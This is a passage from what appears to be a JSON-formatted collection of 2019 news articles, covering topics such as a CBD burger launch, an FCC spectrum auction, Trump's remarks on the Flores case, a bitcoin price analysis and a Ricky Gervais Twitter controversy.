organization made recommendations on how to better develop blockchain technology, including the introduction of interoperability and scalability standards. \nEarlier, in December last year, the same group also made a case for a blockchain-based digital identity system and digital versions of national currencies.",

      "title": "Carl's Jr. will become the first major fast-food chain to debut a cannabis-infused burger",
      "text": "Carl's Jr. \nCarl's Jr. is debuting a cannabis-infused burger on 4/20. \nThe Rocky Mountain High: CheeseBurger Delight will be topped with CBD-infused Santa Fe Sauce, and will be sold at a lone location in Denver, Colorado for a single day. \nIt will cost $4.20. \nIf the burger sells well, Carl's Jr. may consider expanding the test and selling CBD-infused burgers at more locations, an executive told Business Insider. \nVisit BusinessInsider.com for more stories . \nCarl's Jr. is making history this 4/20. \nOn Saturday, Carl's Jr. will debut the CBD-infused Rocky Mountain High: CheeseBurger Delight at a single location in Denver, Colorado. The CBD Burger will be available for $4.20 during the one-day test, fittingly held on April 20, a weed-filled celebration for many Americans. \nWith the test, Carl's Jr. will become the first major fast-food chain to roll out a cannabis-infused menu item \u2014 even if just for a one location, one-day event. \nThe CheeseBurger Delight consists of two beef patties, topped with pickled jalapenos, pepper jack cheese, fries, and CBD-infused Santa Fe Sauce. \nThe rise of the CBD-infused burger \nHollis Johnson/Business Insider \nCarl's Jr. has been working on the CBD Burger since its vegan Beyond Meat burger launch in early January, according to Patty Trevino, Carl's Jr.'s senior vice president of brand marketing. \nUnlike most menu tests, one of Trevino's first conversations when Carl's Jr. decided to try to make a CBD-infused burger was with the company's legal team. The Denver restaurant was picked as the 4/20 test spot in part because of Colorado's decision to legalize marijuana in 2014. \nTrevino says the test is more than a one-day 4/20 stunt. Carl's Jr. will be monitoring sales, as well as customer and franchisee response. If all goes well, Trevino says that expanding the test remains an option \u2014 with the possibility of one day rolling out a CBD-infused burger across America. \n\"If anyone is going to do it, I would want Carl's Jr. to do it,\" Trevino said of the prospect of launching a CBD-infused menu item nationally. \nWhile navigating state-by-state regulations could prove to be challenging, Trevino says that Carl's Jr. has an advantage as a West Coast chain, operating in more states that have fully legalized marijuana. In total, Carl's Jr. and sister brand Hardee's \u2014 which dominates the South and Midwest \u2014 have 3,800 locations in 44 states and internationally. \nCBD has been celebrated for its potential health benefits and functions as the non-psychoactive component of marijuana \u2014 meaning that eating a CBD Burger will not get you high. With the passage of the Farm Bill, CBD is going mainstream, despite reports of dangerous ingredients and misleading labels. \nBy Chloe/Leslie Kirchoff \nRetailers and restaurants are increasingly intrigued by CBD, with CVS and Walgreens signing deals to sell CBD topicals and trendy chain By Chloe serving up CBD-infused sweets. A team of analysts at the investment bank Cowen recently estimated that the US market for CBD could skyrocket to $16 billion by 2025 from roughly $1 billion to $2 billion now. \nCarl's Jr. is sourcing its hemp-derived CBD oil from BlueBird Botanicals, a Colorado-based company. \n\"If you were to ask me [about CBD and legal weed] when I was at Burger King back in the mid-2000s, I would have been like, no way,\" Trevino said. \"But today, this is a huge trend with consumers.\" \nThe Rocky Mountain High: CheeseBurger Delight will be sold at a Carl's Jr. location located on 4050 Colorado Blvd. in Denver, Colorado starting at 6 a.m. on Saturday morning, while supplies last.

      "text": "Popular daytime spot Arlequin Cafe \u2014 with its lovely, unparalleled back patio \u2014 served its last panini on Sunday, as the Absinthe Group says the concept is no longer penciling, financially. And it's one of a half dozen restaurants open for 20 years or more that's called it quits in recent weeks. \nIn a note to customers on the website, Absinthe Group says, \"After almost two decades of loyal patronage, we thank both our customers and employees for their support throughout the years. Unfortunately, it is with a heavy heart that we must close the doors of Arlequin Caf\u00e9 at this time.\" \nBill Russell-Shapiro, owner of the Absinthe Group, tells the Chronicle, \"I regret this so much,\" and says that the current business model, \"no longer allows us to pay people what they need and deserve.\" \nIt's a refrain that's been heard all over town, however it seemed in recent years that fast-casual models, like Arlequin, which don't have to employ as full of a front-of-house staff, were one way that restaurateurs were adjusting to current fiscal pressures. \nBut the Absinthe Group isn't giving up the space, which adjoins the Arlequin wine bar and retail shop, and they say, \"Be on the lookout for what we will be cooking up here later this year. We hope to bring something new to Hayes Valley that the community will enjoy once again.\" In the meantime, it just means more abundant seating for wine bar patrons who want to grab a glass or a bottle and lounge in that lush backyard. \nRussell-Shapiro suggests to the Chronicle that adjustments to the menu to cut costs ended up angering customers, and the team finally decided to pull the plug. Some staff members are being given jobs at other Absinthe Group properties (which include Barcino , Absinthe, Comstock Saloon, and Bellota ), but others are receiving a severance, as it seems the re-concepting is not going to happen too rapidly. \nThe long, narrow cafe space may not lend itself to much besides, say, an expansion of the wine bar \u2014 which Russell-Shapiro says is doing \"quite well\" compared to all of the group's businesses. But stay tuned for further details as they take shape.",

      "text": "Dive Brief: \nTarget leverages data science to help improve on-shelf availability, reduce inventory levels and create operating efficiencies, according to Paritosh Desai, SVP and chief data and analytics officer, speaking at The AI Summit in New York last week. \nThe company hosts 30 million shoppers per week at its 1,800 stores. \"We're dealing with problems that are extremely large,\" said Desai. \"And we're not just solving for today but for next week and next month.\" \nTo solve its complex data science problem, leadership blends traditional data science methods with modern techniques like neural networks to improve performance of demand-forecasting models. \nDive Insight: \nWinners in the retail market are putting data to work . \nIn the case of a national chain the size of Target, that means keeping tabs on an inventory of around 1 million products, then using data to ensure availability. \nIn 2017, Target began testing algorithms to increase fulfillment velocity in its supply chain. By the following year it saw its out-of-stock levels decrease 40% at a facility in Perth Amboy, New Jersey. \nIn its approach to modernization, Target has learned to lean on the physicality of retail to achieve better results. \n\"A lot people have predicted that stores will not have a place in the future with online shopping and e-commerce taking over,\" Desai said. \"What we say is that stores are our most important asset.\" \nWith 70% to 80% of Americans living within 10 miles of a Target store, the chain opted to rely on the stores as hubs to help fulfill digital demand. Services such as buy online, pick up in store (BOPIS) and Drive Up add complexity and scale to the math the data science team is solving for. \n\"When you have so many ways to fulfill demand, it's important to have the product in the right place at right time,\" Desai said. \nWith initial improvements proving valuable, the company is planning further efforts around distribution center automation and design, said John Mulligan, Target EVP and COO, during its Q3 2019 earnings call. \nCorrection: This article has been updated to clarify Target's out-of-stock levels decrease of 40% was in Perth Amboy, New Jersey.",

      "text": "Cars\u2019 digital dashboards can increasingly perform tasks with a single touch: make a phone call, launch Spotify or Pandora, display directions to your destination. Soon, we can add ordering pizza to that list. \nDomino\u2019s announced yesterday it has partnered with Xevo Inc., \u201cthe global leader of in-vehicle commerce and services for automakers,\u201d to automatically preload the AnyWare pizza-ordering app on millions of vehicles equipped with the Xevo platform later this year. Once a customer logs in, the app will allow customers to order from Domino\u2019s with just a few screen touches. The screen will display customers\u2019 \u201cEasy Order\u201d (a preset favorite order) or the customers\u2019 most recent order, allowing them to order quickly without reselecting individual items. It will also display order tracking so a driver knows just how much time they have to get home before the pizza arrives, or allow the driver to order by phone from the touchscreen. Xevo is currently installed in about 25 million vehicles worldwide, per PYMTNS.com . \n\u201cAt Domino\u2019s, we want pizza ordering to be simple and always within reach, no matter where a customer happens to be,\u201d Chris Roeser, director of digital experience at Domino\u2019s, said in a statement announcing the partnership. \nWith vehicle dashboards already programmed with apps like Google Maps, Pandora, Stitcher, Spotify, etc., why does this Domino\u2019s app feel so different? Somehow it does. Playing music and looking up directions are tasks we expect to perform near-daily in our cars; perhaps ordering pizza is just the next logical step. After all, many remote controls that come with streaming sticks these days come preprogrammed with Netflix or Amazon buttons, and cross-tech promotions are everywhere. Remember when all new iPhones came with the new U2 album ? This is surely less offensive than that disaster. We do have to caution drivers to stay alert while using the AnyWare app, because choosing between cheesy breads can be mighty distracting.",

      "title": "Donald Trump Derides \u2018Judge Flores\u2019 for Reno v. Flores Immigration Case Actually Named for Migrant Teen Jenny Lisette Flores",
      "text": "President Donald Trump at a Border Patrol station in Calexico, California, on Friday railed against what is commonly known as the \"Flores decision\" \u2014 a landmark federal immigration case \u2014 calling it a \u201cdisaster for our country\u201d and publicly calling out \"Judge Flores\" for making the bad decision. The problem with that sentiment: The Flores in that case's title was not a judge, but a teenage girl named Jenny Lisette Flores. \n\u201cSome very bad court decisions. The Flores decision is a disaster. I have to tell you, Judge Flores, whoever you may be, that decision was a disaster for our country,\u201d Trump said to the panel. \u201cA disaster and we\u2019re working on that.\u201d \nNone of the panelists immediately corrected the president. \nThe 1997 agreement in Reno v. Flores requires the U.S. government to release migrant children from detention without unnecessary delay to their parents, adult relatives or programs licensed to care for them. The settlement also requires immigration officials to provide the detained migrant children with food, drinking water, toilets, emergency medical assistance and other basic needs. \nIt was named after Flores, a 15-year-old girl who fled El Salvador in 1985 and tried to enter the U.S. to live with her aunt. The Immigration and Naturalization Service, a government agency at the time, arrested Flores at the border and put her in a juvenile detention center. She was strip-searched and handcuffed in the process. \nThe Immigration and Naturalization Service would not give Flores\u2019 aunt custody of her because it was not allowed to release children to third-party adults. The agreement came after the American Civil Liberties Union filed a class-action lawsuit on behalf of Flores and other minors in similar situations. \nThe Reno named in the case is Janet Reno, who was then-President Bill Clinton\u2019s attorney general. \nPresident Donald Trump speaks to the press as he departs the White House in Washington, D.C., on April 5, 2019. Trump is traveling to California for a visit to the US-Mexico border, and to Nevada. Trump blamed \"Judge Flores\" for the Flores decision, which was actually named after an unaccompanied migrant child. NICHOLAS KAMM/AFP/Getty Images \nIn July, U.S. District Judge Dolly Gee in Los Angeles, California, rejected an attempt by the Justice Department to modify the Flores agreement by requesting a longer period of time to be able to detain migrant children than 20 days, as allowed under the settlement. The Trump administration sought to indefinitely detain migrant children caught illegally crossing the border with their parents. \nAt the time, Justice Department spokesman Devin O'Malley stated opposition to the judge\u2019s decision. \n\"We disagree with the court's ruling declining to amend the Flores agreement to recognize the current crisis of families making the dangerous and unlawful journey across our southern border, but the court does appear to acknowledge that parents who cross the border will not be released and must choose between remaining in family custody with their children pending immigration proceedings or requesting separation from their children so the child may be placed with a sponsor,\" O'Malley stated. \"The Justice Department continues to review the ruling.\"",

      "text": "Conservative commentator and broadcaster Glenn Beck has slashed the price of his Texas mansion by more than $1 million after struggling to sell for a year and a half. \nThe 9,000-square-foot mansion in Westlake\u2019s Vaquero Club golf community was built in 2004 in the French country house style, according to Realtor.com . Beck and his wife, Tania Beck, bought the home in 2012 for an undisclosed amount and listed it for $6.2 million in May 2018. \nThey have now lowered the price to $4.95 million, or what amounts to a roughly 20 percent discount. \nLocated at 2224 King Fisher Drive , the Westlake mansion boasts five bedrooms, six-and-a-half bathrooms, a guest house, a pool with a diving area and a spa. Many of the rooms boast views of the golf course while the outside has several outdoor rest areas, a pergola with views of the course and a fire pit. \nCompass\u2019 Jeff Watson is the agent representing the property. \n\u201cBeautifully finished with stone and hardwood flooring, vaulted ceilings with exposed beams, exquisite granite and stone counters, chiseled stone walls & elegant fireplaces throughout,\u201d reads the listing. \nBeck was best known for his self-titled one-hour news program on Fox News, which aired from 2009 to June 2011. After splitting from the news channel, he moved to Dallas and founded a conservative television and radio network called The Blaze. Throughout his career, Beck has espoused far-right views about topics such as healthcare and immigration while promoting conspiracy theories about President Barack Obama, George Soros and global warming. \nAre you ready for what the industry holds in 2020?

      "title": "FCC\u2019s mmWave auction sees aggressive bidding amid ongoing T-Mobile/Sprint merger trial",
      "text": "US MNO T-Mobile (NASDAQ:TMUS) is expected to amass significant spectrum from the FCC\u2019s third mmWave auction, which has exceeded US$4bn in gross proceeds as of round 21, while its merger outcome with smaller rival Sprint (NYSE:S) looks increasingly optimistic. \nAuction 103, which involves 35 qualified bidders, includes a total of 3,400MHz of spectrum in the upper 37GHz, 39GHz and 47GHz bands, offering more than 14,100 licences. \nThe FCC divided the spectrum into two licence categories: 24 100MHz licences in the 37GHz and 39GHz frequency blocks are dubbed MN, while 10 100MHz licences in the 47GHz band are called P. \nAnalysts including Allnet Insights & Analytics president Brian Goemmer believe T-Mobile will quickly catch up with US incumbents, Verizon (NYSE:VZ) and AT&T (NYSE:T), in high-band spectrum ownership during this auction, though these two would probably remain the largest 39GHz spectrum owners. \nGoemmer told Connectivity Business: \u201cVerizon and AT&T already controlled 30% of the 39GHz band each prior to the auction,\u201d noting the \u201cvery defined\u201d band has attracted attention from handset manufacturers and network equipment providers in particular. \nBidding for the 47GHz band seems relatively softer, which will likely lead to unsold or lightly in-demand licences outside of the urban areas, Goemmer predicts. \n\u201cOverall, it does appear there\u2019s more strength in the urban areas,\u201d he added, \u201csince carriers don\u2019t seem to be so concerned with covering the entire country with these bands.\u201d \nSasha Javid, COO of Spectrum Consotium and a former chief data offer and legal adviser for the FCC\u2019s Incentive Auction Task Force in 2016, noted demand for the MN licences is indeed higher than the P licences. The consortium aims to advance the adoption of the ATSC 3.0 transmission standard across the broadcast industry. \nNew York City currently has the highest posted price at a range between US$14.5m and US$19.2m, he wrote in an analysis, but the most expensive licences on a MHz/Pop basis are the MN licences for Milwaukee, Wisconsin; Oklahoma City, Oklahoma; and Las Vegas, Nevada. \nThe aggressive bidding comes as incumbents in the 39GHz band are expected to receive bidding credits if they win blocks in the MN licences. \n\u201cIt is possible that incumbents in the band are bidding more aggressively for these blocks knowing that they will receive bidding credits which will reduce the total price paid,\u201d he said. \n\u201cAnd if they do not win, [they] will still receive incentive payments which will be based on the final clock price for these blocks \u2014 yet another reason to bid more aggressively.\u201d \nSprint continues to focus on merger \nAuction 103 is proceeding amid the ongoing trial for the US$26bn tie-up between T-Mobile and Sprint, involving over a dozen opposing state attorneys who believe the deal would reduce US wireless competition and increase prices for consumers. \nGoemmer believes having the merger materialised is Sprint\u2019s primary focus right now, and it has very little interest in bidding for more spectrum. \n\u201cI don\u2019t expect Sprint to be the winner [in the auction] at all,\u201d he said. \u201cI\u2019m not sure how it is participating and whether it really has the funding to win licences,\u201d even though the MNO has a significant mmWave spectrum disadvantage compared with other major carriers in the US. \n\u201cThe mmWave spectrum [Sprint] owns today is mostly in Anchorage, Alaska,\u201d Goemmer noted. \u201cThey have a really great spectrum asset \u2014 the 2.5GHz band, but they would be unable to build a network that delivers one gigabyte per second, which can only be done with mmWave.\u201d \nGoemmer used to work at Clearwire, a Washington-based service operator that Sprint acquired in 2013. \nHe is among other insiders who believe Sprint could go bankrupt if its merger with T-Mobile falls through, citing the former\u2019s debt load. \nT-Mobile CEO John Legere has also outlined how difficult it would be for Sprint to turn around its business in a way that T-Mobile did back in 2012. \nAccording to quotes obtained by New Street Research at the court trial, Legere reportedly said: \u201cSo the AWS spectrum that was given, the cash that was given, the availability of MetroPCS, and the scale that came with it, and the network that came with it, and the financial situation that T-Mobile was in was dire, but nothing compared to the distress that Sprint is in at this point in time.\u201d \nPromising merger outlook with Dish\u2019s network buildout \nRaymond James lowered the odds of a successful T-Mobile merger outcome with Sprint from 85% to 55% when the trial began on 9 December. \n\u201cWe had hoped to see significantly more state AGs reach agreements with [the two carriers] and drop out of the state AG lawsuit opposing the merger,\u201d analyst Ric Prentiss wrote in a note. \u201cBut as the trial started, there were still 14 democratic state AGs, including D.C., suing to block the deal.\u201d \nHowever, other analysts including Timothy Horan from Oppenheimer and Vivek Stalam from New Street Research believe the deal result is looking increasingly promising, especially after US satellite broadcaster Dish Network \u2019s (NASDAQ:DISH) chair Charlie Ergen presented at the trial how his company will become a viable wireless competitor in the US and build out a greenfield 5G network. \nThrough an MVNO agreement with T-Mobile, Ergen said Dish will cover 92-98% of the US population and have access to both low-and mid-band spectrum, which makes it more favourable versus Sprint that has a 79-95% coverage on a standalone basis, according to Horan. \nErgen also reportedly revealed that Dish had received high confidence letters of credit for US$10bn each from three banks \u2014 Morgan Stanley, JP Morgan and Deutsche Bank \u2014 to help it build the new network, which is estimated to cost between US$8bn and US$10bn. \nAs part of the T-Mobile/Sprint merger-related agreement with the DoJ, Dish has previously committed to building 15,000 mobile masts by 2023, which Stalam sees as a \u201cmilestone that Dish would easily clear on its path to 75,000 sites over time\u201d. \nMid-band spectrum gaining interest \nWhile more mmWave is still up for grabs, mid-band spectrum including C-band and CBRS is also expected to draw active bidding from telecoms players during upcoming auctions. \nWells Fargo analyst Jennifer Fritzsche noted US cableco Charter (NASDAQ:CHRT) recently expressed interest in acquiring C-band and CBRS, making her believe 2020 will be the year when \u201ccablecos wireless strategy\u2019s rubber meets the road\u201d. \nCharter seemingly finds itself at the fork of this road right now, but \u201cthe key question is which side of the fork does it follow\u201d, Fritzsche wrote. \u201cGiven Comcast \u2019s (NASDAQ:CMCSA) other issues and priorities \u2014 Peacock, Sky , and possible NBC management changes, Charter may be the one to set out first on that path.\u201d \nAdditionally, the US wireless industry has also proposed to clear up 600MHz of the 6GHz band for auction. \nThe spectrum band, however, is being somewhat overlooked by investors, according to Fritzsche, and she expects an order on the plan for 6GHz to come in early 2020. \n\u201cWhile C-band will likely warrant a higher value than 6GHz on a MHz/Pop basis,\u201d Fritzsche said, \u201ca case could be made that the absolute dollar of the potential proceeds that could come to the FCC and Treasury from a future 6GHz auction are not that meaningfully different from what could be seen from C-band.\u201d \nShe added: \u201cIn years ahead, we see both C-band and 6GHz playing an important role in the evolving 5G spectrum landscape.\u201d",

Well, before we get to the punchline, here\u2019s the set-up: \nOn Thursday, Rowling made headlines with a single tweet supporting a researcher, whose anti-transgender social media posts were judged by a tribunal to be \u201coffensive and exclusionary,\u201d as well as \u201cincompatible with human dignity and fundamental rights of others.\u201d \nA day after Rowling came under attack, Gervais leapt into the fray. \nGervais also responded to a tweet by Jarvis Dupont , a satirist for Spectator USA who purports to be transgender, but routinely mocks trans women and what some decry as \u201cpolitically correct culture.\u201d \nGervais may not have been aware Dupont\u2019s is a parody account , and on Friday he launched what The Advocate called \u201ca Tweetstorm:\u201d \nIt\u2019s hard to imagine anyone could miss that Dupont\u2019s tongue is planted firmly in their cheek, with just a glance at their Twitter profile: \u201cI use my white privilege as a raft, to transport minorities from the Cave of Oppression to the Island of Equal Prosperity. Transwoman. She/Her.\u201d \nAs his followers responded, Gervais dug deeper, accusing \u201cmen\u201d of eroding \u201cthe rights of women\u201d through a \u201cnew cunning way to dominate and demonize an entire sex.\u201d \nWithin the first hour, Gervais attempted to differentiate the target of his tweets, drawing a line between trans women and male predators : \nThe problem with this, as Time magazine reported in 2016, is that the bathroom predator argument is by and large a myth , with rare exceptions. Since laws allowing trans people to use bathrooms matching their gender identity have been in effect in the U.S., research shows there\u2019s been no evidence of an increased safety threat. Pre-existing laws serve to prevent, deter and punish predatory behavior. The U.K. has these laws, too, of course . \nLast year in Scotland, an 18-year-old trans woman admitted to assaulting a 10-year-old girl in a supermarket ladies room, threatening to stab the child\u2019s mother and demanding the girl remove her pants. Media reports describe it as a \u201csexual assault\u201d but Katie Dolatowski was given the equivalent of supervised probation, community service and forced to register as a sex offender. It was her second arrest, after being caught spying on another child in another store\u2019s women\u2019s lavatory a few weeks earlier. \nMichelle Martinez , a trans woman in Wyoming, is starting her second year of a minimum 30-year sentence for the sexual abuse of a 10-year-old girl in that child\u2019s home, in her bathroom. The girl\u2019s mother was described as a family friend of Martinez. \nAnother so-called \u201cbad apple\u201d is Jessica Yaniv of British Columbia , a trans woman who has been accused of predatory behavior involving minors , but never charged. In October, Yaniv lost her bid for a discrimination claim against salons and spas that refused to serve her when she repeatedly attempted to get a Brazilian wax, among other services. According to the ruling by a human rights tribunal, she had been repeatedly deceptive, targeted small businesses for financial gain \u201cor to punish certain ethnic groups which she perceives as hostile to the rights of LGBTQ+ people.\u201d Yaniv has been called \u201cproblematic\u201d and remains the subject of much hand-wringing among trans advocates. \nAnd that makes three. Like every marginalized group, trans people are often pressured to have to point to someone with a less than sterling reputation, and say, \u201cDon\u2019t lump me in with them. That\u2019s not me.\u201d Even Caitlyn Jenner, a favorite target of Gervais the last time he hosted the Golden Globes four years ago next month, has her detractors in the trans community. \nIn another one of his tweets, the comic actor mocked those who would publicly advocate for transgender rights, and then tweeted a full-throated denunciation of trans activists, by comparing them to Islamic hardliners, even going so far as to use the term, \u201cfatwah,\u201d which actually means \u201clegal opinion\u201d but is often misused to convey intolerance and violence. \nIn another anti-trans tweet, Gervais took a moment to agree with someone who worked with a trans person, who said it\u2019s \u201cthe self-ID nutjobs who are causing the trouble.\u201d That\u2019s a reference to the UK\u2019s ongoing debate over proposed changes to the country\u2019s law that currently imposes a heavy burden of bureaucracy and gatekeeping on a transgender person before they can change their legal identification documents. Then he asked someone on the other side of the issue why they hadn\u2019t reported him to Twitter for \u201cvile bigotry.\u201d \nGervais would later tweet that all this was simply sarcasm . But a full seven and a half hours passed, during which Gervais was harangued on Twitter and reported on by Variet y and several other news outlets , before the comedian finally started offering a clarification of his remarks. \nNearly three hours later, he was still at it. \nAnd finally, more than 31-hours after starting his rant, Gervais issued an affirming declaration for trans women. \nWait, what? \nIt didn\u2019t really matter to LGBTQ Twitter and their allies. They were all too eager to call out Gervais, given his record of attacking trans people . Some tagged the Hollywood Foreign Press Association \u2014 the group behind the Golden Globes \u2014 and demanded Gervais be fired in advance of next month\u2019s awards show; Others noted how social media malpractice cost almost-host Kevin Hart his Oscars gig earlier this year. \nA spokesperson for the Hollywood Foreign Press Association did not respond to inquiries by press time. \nWhat Gervais seems to miss, whether he\u2019s being sarcastic or trying to make a point about a mythical man dressing up as a woman to prey on children, is that the true victims of predatory behavior are trans women who have repeatedly been questioned and even attacked simply for using a ladies room. \nOf the more than 27-thousand people who took part in a survey by the National Center for Transgender Equality , approximately 12% said they were verbally harassed in public restrooms within the previous year, 1% were physically attacked, and 1% were sexually assaulted. That translates into more than 270 people. \nIt happened to this author just last night in Hartford, Conn.: I showed my drivers license bearing the gender marker \u201cF\u201d for \u201cfemale,\u201d to the management and a complaining patron at a Chinese food buffet restaurant, proving I had every right under state law to pee in the ladies room. And I did so, without further interference. \nAuthor David Thomas, who is writing a diary for The Telegraph about their transition from male to female, shared his perspective: \n\u201cYou know how parents tell children who are scared by spiders, \u2018It\u2019s much more frightened of you than you are of it\u2019? Well, the same thing applies to transwomen in female-only toilets. However frightened women may be by our presence, we are way, way more petrified by having to be there.\u201d \nDavid Thomas \nAs Katelyn Burns wrote this week in her stunning essay for Vox, this animus toward trans people is a cultural phenomenon with deep roots in Great Britain. She quotes Heron Greenesmith , senior research associate at a think-tank called Political Research Associates, as tracing a movement in the prior decade toward greater skepticism, \u201chyperfocused on debunking \u2018junk science.\u2019\u201d \nHis declarative \u201ctrans women are women\u201d tweet notwithstanding, Gervais has certainly tapped into that attitude. \nThis hyperfocus is also evident in President Donald Trump\u2019s crusade against trans military service and in broader efforts to debunk climate change in what some have called the administration\u2019s \u201cwar on science.\u201d \nAfter all this set-up, at long last, here\u2019s the punchline: Trans people are merely pawns to service a far bigger agenda. Whether it be the president or Ricky Gervais, they are looking for attention, like everyone and everything that comes from the media capitals of New York City and Hollywood. And Gervais got it. \nIt\u2019s entirely conceivable he will cash-in another of his \u201cno apologies, I\u2019m just being me,\u201d chips, and point to his trans-affirming tweet, to convince the powers that be he\u2019s still fit to host the Golden Globes. Why not? We live in a world in which claims of bigotry, misogyny, discrimination, even constitutional impeachment cannot be heard any more than a shout into the wind. One horrible person, even three, or more, are seen as emblematic of an entire population. People toss off syllogisms like, \u201cCan\u2019t you take a joke?\u201d \u201cEveryone is entitled to an opinion,\u201d \u201cit\u2019s simple biology,\u201d and in the case of the president, \u201cHe committed no crime.\u201d \nPunching down is so very 2019. Perhaps in 2020, someone will finally, solidly, effectively, punch back up, and land a knockout blow.",

      "title": "Sudden Bitcoin Price Breakout Sets New Bull Target at Over $5K",
      "text": "View \nWith bitcoin\u2019s move today to 4.5-month highs near $5,080, the transition from bear to bull market appears done and dusted. \nThe trend change would gain credence, though, if and when BTC finds acceptance above the former support-turned-resistance of the 21-month exponential moving average (EMA), currently at $5,200. \nThe cryptocurrency is looking overbought as per the 14-day relative strength index, so prices may have a tough time breaking above $5,200 in the near-term. \nBitcoin could see a pullback to $4,400 if signs of bullish exhaustion increase in the next few days. \nAfter today\u2019s breakout, bitcoin (BTC) now needs to move above crucial resistance near $5,200 to solidify the case for a longer-term bull market. \nThe world\u2019s largest cryptocurrency by market capitalization crossed the last bearish lower high of $4,236 (Dec. 24 high) at 04:30 UTC Tuesday and jumped to $5,080 \u2013 the highest level since Nov. 19 \u2013 confirming a transition from a bear to a bull market. \nThe rally to a 4.5-month high was accompanied by a surge in 24-hour trading volumes to above $15 billion \u2013 the highest since mid-January 2018, according to CoinMarketCap . The bullish reversal, therefore, looks sustainable. \nFurther, the spike witnessed today has reinforced the positive trend change signaled by both the weekly moving average convergence divergence (MACD) and the money flow index a few weeks ago. \nWhile the path of least resistance is now to the higher side, the bulls now face taking out the former support-turned-resistance of the 21-month exponential moving average (EMA), currently lined up at $5,200. \nThe persistent defense of that average support in the five months to October 2018 had triggered hopes of a strong bullish move. More importantly, a convincing break below that technical line on Nov. 14 invited strong selling pressure. \nSo the bulls need to force a convincing break above the 21-month EMA before claiming a complete victory over the bears. \nAs of writing, bitcoin is changing hands at $4,800 on Bitstamp, representing a 15 percent gain on a 24-hour basis. \nOther major cryptocurrencies like ethereum\u2019s ETH token, XRP and EOS are up at least 5 percent each. Meanwhile, names like litecoin, cardano and monero are flashing double-digit gains. \nWeekly chart \nAs seen above, BTC\u2019s move above $4,236 has activated twin bullish cues: A bullish higher high and a triangle breakout, both confirming a bearish-to-bullish trend change. \nThe 5- and 10-week moving averages (MAs) are also trending north, indicating a bullish setup, while the relative strength index (RSI) is probing the former support-turned-resistance of 53.70. A break higher would further strengthen the bullish case. \nMonthly chart \nBTC nearly tested the 21-month MA, currently at $5,200, earlier today. A monthly close above that average would solidify the bullish reversal and encourage further buying, possibly leading to a move above $6,000. \nA break above the 21-month EMA, however, may remain elusive for a few weeks, as the cryptocurrency is looking overbought on shorter duration charts. \nDaily chart \nAt 86.00, the 14-day RSI on the daily chart is at the highest level since December 2017. \nThe overbought reading would gain credence if the cryptocurrency creates bullish exhaustion patterns like Doji, bearish engulfing, a candle with a long upper shadow, inverted bearish hammer in the next few days. \nIn that case, prices could fall back to $4,400 (Nov, 29 high) and consolidate. \nDisclosure: The author holds no cryptocurrency assets at the time of writing. \nBitcoin image via Shutterstock; charts by Trading View",

      "title": "Why Selena Gomez And Taylor Swift's Friendship Is The Ultimate \u2018BFF Goals\u2019",
      "text": "Selena Gomez and Taylor Swift have been friends for a little over a decade now, and many look up to their friendship as the ultimate \u201cfriendship goals.\u201d Although both of them have retreated from the spotlight recently, save for a few public appearances and track releases, their friendship is still so alive and well. Here are the reasons their friendship is one for the ages. \n1. Swift has a framed photo of her and Gomez in her home \nJust when fans thought it was friendship over between them, Swift posted a video on Instagram showing herself playing with two cats in her home. Caught in the video was a framed photo of her hugging Gomez. Who still does that nowadays? \n2. Gomez has the nicest words to say about Swift \nWhen one fan asked Gomez about Swift on Instagram, Gomez replied with something that only solidified their BFF status. \u201cTaylor\u2019s awesome. I love her. She\u2019s amazing. I talked to her today. She\u2019s literally like my big sister, I tell her everything. She\u2019s so smart it freaks me out,\u201d Gomez said. \n3. They don\u2019t let boys get in the way \nThere was a time when Gomez and Swift were rumored to be feuding over Justin Bieber, but the issue only made them chuckle off their feet. \u201cPeople think they have my relationships all mapped out,\u201d Swift said in a later interview. \u201cThere were all these blogs, like, \u2018Are they feuding? Are they fighting?\u2019 Meanwhile, Selena and I would be on the phone that night, laughing about it. We let them have that one,\u201d she added. \n4. They celebrate each other\u2019s successes \nIn a 2017 interview with Apple Music\u2019s Zane Lowe, Gomez told the world how much she loved Swift and how happy she was for all that her BFF had achieved so far. \u201cIt\u2019s everything you would want and more so I\u2019m very proud and obviously a major fan,\u201d she said. \n5. Even their parents approve of their friendship \nGomez\u2019s mom got interviewed once before the launch of \u201c13 Reasons Why,\u201d and she made a clean breast of what she thought about her daughter\u2019s friendship with Swift. \u201cWhat I love about that friendship is it\u2019s so solid, and with Taylor I feel like they can tell each other anything and it will be an honest, in-your-best-interest kind of relationship,\u201d she said. \n6. Swift was there for Gomez throughout her mental health ordeal \nAs Gomez slowly started to step back into the spotlight after her bout of depression last year, she leaned on Swift for support. A source revealed in an interview that Swift did everything for Gomez privately, making it a point that she's always there for her BFF after Gomez\u2019s treatment. \nMusicians Selena Gomez (L) and Taylor Swift attend the 58th GRAMMY Awards at Staples Center on February 15, 2016, in Los Angeles, California.

      "text": "Former NFL wide receiver Nate Burleson is lounging on a throne in a fitted suit, spitting snippets of capitalist slang: \n\u201cIt\u2019s Mount Cashmore.\u201d \n\u201cDolla dolla bills y\u2019all.\u201d \n\u201cProtect your crown like a dentist.\u201d \nBehind him is a green screen that, we\u2019re told, will show a giant sportsbook filled with the betting lines for the NFL\u2019s Conference Playoffs, all part of a commercial for DraftKings \u2018 new postseason campaign. \nIt all would have seemed unthinkable just a decade ago: combining the prestigious and closely guarded NFL brand with the world of sports betting. But this season, DraftKings became the official daily fantasy partner of the NFL. \nThat\u2019s not all DraftKings does. There are two separate products under the DraftKings brand. The first, daily fantasy sports, lets fans pick a different set of athletes every week to compete for a payout. It\u2019s legal in most states. \nThe other is sports betting, only recently legalized in New Jersey, Pennsylvania, West Virginia and Indiana. Even though DraftKings has paid out $7 billion in winnings, according to CMO Tom Goedde, legal sports betting in the U.S. could be worth as much as $7.9 billion by 2024 . \nDraftKings will advertise locally in markets where sports betting is legal, while focusing its national campaign on the daily fantasy sports product with ads running on Fox, the NFL Network and across DraftKings\u2019 digital channels. \nThey\u2019ll be seen starting Jan. 18 and will run right up until the pregame of Super Bowl 54 on Feb. 2. The ads are segmented into five 30-second clips as well as one 60-second clip and one 15-second clip. \nThe campaign, called \u201cMade in America,\u201d will feature Burleson touting DraftKings\u2019 latest promotions and calling on players to \u201cbe brave in the land of the free.\u201d \nWhile \u201cMade in America\u201d isn\u2019t exactly an original tagline, it makes sense considering that most of DraftKings\u2019 competition comes from the murkier world of offshore gambling websites. Even its professional competition, FanDuel, is owned by an Irish company. \n\u201cThe concept harkens back to the fact that DraftKings is a made-in-the-USA brand,\u201d Goedde said. \u201cIn America, royalty isn\u2019t inherited; it\u2019s earned.\u201d Being an American company also means a regulated 